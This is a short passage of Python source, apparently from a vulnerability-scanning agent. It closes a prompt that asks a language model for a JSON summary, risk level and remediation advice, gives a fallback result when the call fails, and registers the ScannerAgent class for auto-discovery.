            "返回JSON格式:\n"
            '{"summary": "总结", "risk_level": "critical/high/medium/low", '
            '"remediation": ["修复建议1", "修复建议2"]}'
        )

        try:
            return await self.ctx.llm.chat_json_pro(prompt)
        except Exception:
            return {"summary": f"发现 {len(self.findings)} 个漏洞", "risk_level": "high"}
# Auto-discovery reference
AGENT_CLASS = ScannerAgent
